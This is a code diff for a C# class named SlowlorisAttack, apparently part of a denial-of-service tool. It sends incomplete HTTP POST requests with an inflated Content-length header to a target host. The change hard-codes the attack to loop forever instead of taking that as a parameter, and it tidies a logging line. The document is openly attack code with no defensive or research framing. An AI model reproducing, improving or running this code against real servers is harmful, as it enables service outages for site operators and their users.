@@ -17,11 +17,11 @@ namespace SlowLoris
        
 
 
-        public SlowlorisAttack(string host, int port , int threadSleep , bool loop, int id)
+        public SlowlorisAttack(string host, int port , int threadSleep , int id)
         {
             Website = host;
             this.Port = port;
-            this.Loop = loop;
+            this.Loop = true;
             this.ThreadSleep = threadSleep;
             Id = id;
         }
@@ -51,10 +51,7 @@ namespace SlowLoris
                                 writer.Write("POST / HTTP/1.1\r\nHost: " + Website + "\r\nContent-length: 5235\r\n\r\n");
                                 writer.Flush();
                                 if (Loop)
-                                {
                                     Log("Send: '" + Count + "' by '" + Id +  "' to '" + Port + "'");
-                                 
-                                }
                                 Count++;
 
                             }
